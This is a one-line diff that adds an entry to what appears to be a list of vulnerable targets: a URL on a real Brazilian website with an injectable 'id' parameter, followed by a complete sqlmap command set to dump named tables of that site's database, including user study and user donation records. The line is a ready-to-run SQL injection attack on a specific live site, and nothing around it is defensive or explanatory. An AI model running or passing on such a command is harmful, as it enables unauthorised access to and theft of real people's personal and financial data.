@@ -1,0 +1,1 @@
+https://www.jesse.com.br/jesse/reflexoes/reflexoes_detalhes.php?id_reflexoes=17 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.jesse.com.br/jesse/reflexoes/reflexoes_detalhes.php?id_reflexoes=17 -D jesse_site -T Estudos_Usuario,Doacoes_Usuarios,Controle --dump
